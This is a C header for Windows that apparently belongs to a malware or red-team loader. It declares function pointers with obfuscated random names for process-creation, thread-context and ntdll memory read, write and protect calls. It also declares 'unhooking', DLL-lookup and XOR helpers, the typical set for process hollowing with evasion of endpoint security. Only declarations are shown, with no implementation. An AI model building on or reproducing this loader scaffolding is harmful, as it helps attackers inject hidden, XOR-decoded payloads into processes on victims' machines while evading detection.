#include <windows.h>

// kernel32 function
typedef HMODULE(WINAPI* LOADLIBRARYA)(
	LPCSTR ModuleName
	);

typedef BOOL(WINAPI* tvgzqnoeihfh_t) (
	LPCSTR                lpApplicationName,
	LPSTR                 lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCSTR                lpCurrentDirectory,
	LPSTARTUPINFOA        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef BOOL(WINAPI* eqsxvbarvtdd_t)(
	HANDLE hProcess,
	UINT uExitCode
	);

typedef BOOL(WINAPI* lgaebehmwwjo_t)(
	HANDLE hObject
	);

typedef HANDLE(WINAPI* aorclcchegyu_t)(
	LPCSTR                lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
	);

typedef DWORD(WINAPI* zlwmhqsfvcqu_t)(
	HANDLE  hFile,
	LPDWORD lpFileSizeHigh
	);

typedef BOOL(WINAPI* cyertryxidbu_t)(
	HANDLE       hFile,
	LPVOID       lpBuffer,
	DWORD        nNumberOfBytesToRead,
	LPDWORD      lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
	);

typedef BOOL(WINAPI* mztrdriqwotf_t)(
	HANDLE    hThread,
	LPCONTEXT lpContext
	);

typedef BOOL(WINAPI* buqefpmwmduy_t)(
	HANDLE        hThread,
	const CONTEXT* lpContext
	);

typedef DWORD(WINAPI* nkokllmibpvk_t)(
	HANDLE hThread
	);

typedef void(WINAPI* wqwxjlulhemu_t)(
	DWORD dwMilliseconds
	);

//ntdll function
typedef NTSTATUS(NTAPI* chnplwnpriqy_t)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
	);

typedef NTSTATUS(NTAPI* rpfgpexnugke_t)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	PULONG NumberOfBytesToProtect,
	ULONG NewAccessProtection,
	PULONG OldAccessProtection
	);

typedef NTSTATUS(NTAPI* ezrjzfjjdkqx_t)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	SIZE_T NumberOfBytesToWrite,
	PSIZE_T NumberOfBytesWritten
	);

typedef NTSTATUS(WINAPI* zexuaydozwbp_t)(
	HANDLE               ProcessHandle,
	PVOID                BaseAddress,
	PVOID               Buffer,
	ULONG                NumberOfBytesToRead,
	PULONG              NumberOfBytesReaded
	);

// msvcrt functions
typedef int(WINAPI* pxrqfhqypmke_t)(
	const wchar_t* format,
	...
	);

extern  UINT64 kernel32dll;
extern  HMODULE ntdlldll;

extern  tvgzqnoeihfh_t tvgzqnoeihfhFunc;
extern  eqsxvbarvtdd_t eqsxvbarvtddFunc;
extern  lgaebehmwwjo_t lgaebehmwwjoFunc;
extern  aorclcchegyu_t aorclcchegyuFunc;
extern  zlwmhqsfvcqu_t zlwmhqsfvcquFunc;
extern  cyertryxidbu_t cyertryxidbuFunc;
extern  mztrdriqwotf_t mztrdriqwotfFunc;
extern  buqefpmwmduy_t buqefpmwmduyFunc;
extern  wqwxjlulhemu_t wqwxjlulhemuFunc;
extern  nkokllmibpvk_t nkokllmibpvkFunc;
extern  LOADLIBRARYA egjswrwqfvuqFunc;

extern  chnplwnpriqy_t chnplwnpriqyFunc;
extern  rpfgpexnugke_t rpfgpexnugkeFunc;
extern  ezrjzfjjdkqx_t ezrjzfjjdkqxFunc;
extern  zexuaydozwbp_t zexuaydozwbpFunc;

extern  pxrqfhqypmke_t pxrqfhqypmkeFunc;

void LoadFunctionBeforeUnhooking();
void LoadFunctionsAfterUnhooking();
PVOID GetDll(PWSTR FindName);
char* strstrFunc(const char* string, const char* substring);
PVOID bzbhxuhreuvmbi(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length);
void sleep();
void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len);
int my_strcmp(const char* p1, const char* p2);
